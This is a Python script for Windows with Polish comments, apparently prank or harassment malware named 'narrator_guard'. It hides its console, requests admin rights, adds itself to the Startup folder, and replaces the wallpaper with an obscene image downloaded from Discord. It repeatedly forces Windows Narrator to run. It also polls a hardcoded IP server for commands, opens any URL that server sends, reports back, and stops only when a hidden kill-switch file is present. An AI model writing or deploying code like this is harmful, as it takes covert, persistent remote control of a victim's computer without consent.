import subprocess
import time
import winreg
import os
import sys
from pathlib import Path
import ctypes
import win32gui
import win32con
import shutil
import win32api
import win32process
import requests
import json
import logging

# Konfiguracja logowania
logging.basicConfig(
    filename='narrator_guard.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def hide_console():
    try:
        # Ukrycie konsoli
        console_window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(console_window, win32con.SW_HIDE)
    except:
        pass

def minimize_narrator():
    try:
        def callback(hwnd, extra):
            if win32gui.GetWindowText(hwnd) == "Narrator":
                win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
        win32gui.EnumWindows(callback, None)
    except:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def stop_narrator():
    try:
        # Próba zatrzymania procesu narratora za pomocą WMI
        import wmi
        c = wmi.WMI()
        for process in c.Win32_Process(name="Narrator.exe"):
            process.Terminate()
            
        # Dodatkowa próba przez PowerShell
        subprocess.run(
            ['powershell', '-Command', 'Stop-Process -Name "Narrator" -Force'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Jeszcze jedna próba przez taskkill
        subprocess.run(
            'taskkill /F /IM Narrator.exe',
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        time.sleep(1)
    except:
        pass

def check_kill_switch():
    try:
        username = os.getenv('USERNAME')
        music_path = f'C:\\Users\\{username}\\Music\\sperma.txt'
        
        if os.path.exists(music_path):
            with open(music_path, 'r', encoding='utf-8') as f:
                first_line = f.readline().strip()
                if first_line == 'kindziuk':
                    return True
    except:
        pass
    return False

def add_to_startup():
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        
        # Ścieżka do aktualnego skryptu i pliku bat
        current_script = os.path.abspath(__file__)
        current_bat = os.path.join(os.path.dirname(current_script), "start_narrator_guard.bat")
        
        # Kopiowanie pliku bat do folderu startup
        target_path = os.path.join(startup_folder, "start_narrator_guard.bat")
        if not os.path.exists(target_path):
            shutil.copy2(current_bat, target_path)
    except Exception as e:
        print(f"Błąd podczas dodawania do autostartu: {e}")

def is_narrator_running():
    try:
        def callback(hwnd, hwnds):
            if win32gui.GetWindowText(hwnd) == "Narrator":
                hwnds.append(hwnd)
            return True
        hwnds = []
        win32gui.EnumWindows(callback, hwnds)
        return len(hwnds) > 0
    except:
        return False

def start_narrator():
    try:
        # Próba uruchomienia narratora za pomocą shell execute
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "open",
            'C:\\WINDOWS\\system32\\Narrator.exe',
            None,
            None,
            win32con.SW_MINIMIZE
        )
        
        # Poczekaj chwilę i zminimalizuj okno
        time.sleep(1)
        minimize_narrator()
    except:
        # Jeśli pierwsza metoda zawiedzie, spróbuj alternatywnej
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = win32con.SW_MINIMIZE
            
            subprocess.Popen(
                'C:\\WINDOWS\\system32\\Narrator.exe',
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(1)
            minimize_narrator()
        except:
            pass

def check_remote_commands():
    try:
        logging.debug("Sprawdzanie komend...")
        # Sprawdź komendy na serwerze VPS
        response = requests.get('http://40.68.189.210/get_commands.php', timeout=5)
        logging.debug(f"Status odpowiedzi: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            logging.debug(f"Otrzymane dane: {data}")
            
            if 'command' in data and 'url' in data:
                if data['command'] == 'open_url':
                    url = data['url']
                    if url.startswith('http://') or url.startswith('https://'):
                        logging.info(f"Otwieram URL: {url}")
                        os.system(f'start {url}')
                        
                        # Wyślij potwierdzenie wykonania
                        requests.post('http://40.68.189.210/confirm_command.php', 
                            json={'status': 'completed'},
                            timeout=5
                        )
    except Exception as e:
        logging.error(f"Błąd: {str(e)}")

def set_wallpaper():
    try:
        # URL obrazka z Discorda
        url = "https://media.discordapp.net/attachments/1038563293628997642/1340117279878287443/sperma.png?ex=67b130f9&is=67afdf79&hm=7c3b10ce8c4f0f765316aa1ccc3a235844fd85bd17783045bb867eddb0a5122f&=&format=webp&quality=lossless&width=1324&height=676"
        
        # Pobierz obraz
        response = requests.get(url)
        if response.status_code == 200:
            # Zapisz tymczasowo obraz
            temp_path = os.path.join(os.getenv('TEMP'), 'wallpaper.png')
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            
            # Ustaw tapetę
            SPI_SETDESKWALLPAPER = 0x0014
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 
                0, 
                temp_path, 
                3
            )
            
            logging.info("Tapeta została zmieniona")
    except Exception as e:
        logging.error(f"Błąd podczas zmiany tapety: {str(e)}")

def main():
    hide_console()
    
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

    # Zmień tapetę od razu po uruchomieniu
    set_wallpaper()

    add_to_startup()
    
    while True:
        if check_kill_switch():
            # Wyłączenie narratora (kilka prób)
            stop_narrator()
            time.sleep(1)
            stop_narrator()
            
            # Usuwanie z autostartu
            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            target_path = os.path.join(startup_folder, "start_narrator_guard.bat")
            if os.path.exists(target_path):
                os.remove(target_path)
            
            # Usuwanie pliku kill switch
            username = os.getenv('USERNAME')
            music_path = f'C:\\Users\\{username}\\Music\\sperma.txt'
            if os.path.exists(music_path):
                os.remove(music_path)
            
            # Zakończenie programu
            break
        
        # Sprawdź komendy z VPS
        check_remote_commands()
        
        if not is_narrator_running():
            start_narrator()
            time.sleep(1)
            minimize_narrator()
        time.sleep(2)

    # Upewnij się, że narrator jest wyłączony przed zakończeniem
    stop_narrator()
    sys.exit(0)

if __name__ == "__main__":
    main() 